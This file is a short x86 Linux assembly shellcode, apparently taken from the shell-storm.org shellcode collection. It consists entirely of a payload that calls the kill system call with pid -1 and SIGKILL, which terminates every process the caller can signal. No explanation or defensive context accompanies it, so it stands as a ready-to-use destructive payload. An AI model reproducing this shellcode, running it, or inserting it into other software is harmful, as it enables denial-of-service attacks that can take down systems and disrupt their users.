; source http://shell-storm.org/shellcode/files/shellcode-212.php

global _start

section .text

_start:

	 push byte 38
	 pop eax
	 dec eax
	 push byte -1
	 pop ebx
	 push byte 10
	 pop ecx
	 dec ecx
	 int 0x80	

